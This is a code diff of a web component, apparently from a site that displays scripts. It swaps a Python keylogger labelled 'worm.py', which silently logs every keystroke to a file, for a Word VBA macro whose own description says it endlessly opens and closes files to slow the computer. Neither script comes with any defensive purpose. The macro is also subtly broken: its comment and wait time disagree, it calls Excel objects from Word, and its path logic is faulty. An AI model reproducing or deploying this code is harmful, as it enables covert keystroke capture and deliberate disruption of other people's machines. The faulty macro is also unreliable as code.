@@ -6,53 +6,56 @@ const FileDisplaykey = () => {
   return (
     <div className="file-display-container">
       <div className="file-display-item">
-        <h2 className="file-display-heading">worm.py</h2>
+        <h2 className="file-display-heading">VBA Macro Code</h2>
         <pre className="file-display-content">
           <code>
             {`
-# Import necessary packages
-from pynput.keyboard import Key, Listener
-import logging
-import os
+Sub OpenAndCloseFilesContinuously()
+' Declare variables
+Dim directoryPath As String
+Dim fileName As String
+Dim fileExtension As String
+Dim wb As Workbook
 
-# Set the directory and filename for the log file
-log_dir = os.getcwd() + "/"
-log_file = log_dir + "keylogging.txt"
+' Set directory path to the folder containing the Word document
+directoryPath = Left(ThisDocument.Path, Len(ThisDocument.Path) - Len(ThisDocument.Name))
 
-# Configure the logger to write to the log file
-logging.basicConfig(filename=log_file,
-                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# Define the function to be called when a key is pressed
-def on_press(key):
-    logging.info(str(key)) # Write the key to the log file
-
-# Start a listener to monitor key presses
-with Listener(on_press=on_press) as listener:
-    try:
-        listener.join() # Wait for the listener to end
-    except KeyboardInterrupt:
-        pass # If the user interrupts the program, exit 
+' Loop continuously
+Do While True
+    ' Loop through all files in directory
+    fileName = Dir(directoryPath & "*.*")
+    Do While fileName <> ""
+        ' Get file extension
+        fileExtension = Right(fileName, Len(fileName) - InStrRev(fileName, "."))
+        
+        ' Check if file is not a folder and is not the Word document
+        If fileExtension <> "" And fileExtension <> "docm" And (GetAttr(directoryPath & fileName) And vbDirectory) <> vbDirectory Then
+            ' Open file
+            Set wb = Workbooks.Open(directoryPath & fileName)
+            
+            ' Close file without saving changes
+            wb.Close False
+        End If
+        
+        ' Get next file name
+        fileName = Dir()
+    Loop
+    
+    ' Pause for 10 seconds before checking for files again
+    Application.Wait (Now + TimeValue("0:00:04"))
+Loop
+End Sub
 
             `}
           </code>
         </pre>
       </div>
-      <div className="file-display-item">
-        <h2 className="file-display-heading">Example Output</h2>
-        <pre className="file-display-content">
-          <code>
-            {`
-
-            `}
-          </code>
-        </pre>
-      </div>
+     
       <div className="file-display-item">
         <h2 className="file-display-heading">Description</h2>
-        <p className="file-display-description">Install using: pip install 
-        <br/>File location may be changed<br/><br/>
-        The code imports necessary packages, slows down the computer
+        <p className="file-display-description">
+        <br/>macro that runs continuously until you close the Word document:<br/><br/>
+        This macro uses a Do While loop to continuously loop through all Excel files in the directory specified by the directoryPath variable, opens and closes each file, and then waits for 4 seconds before starting the loop again, slows down the computer
         </p>
       </div>
     </div>
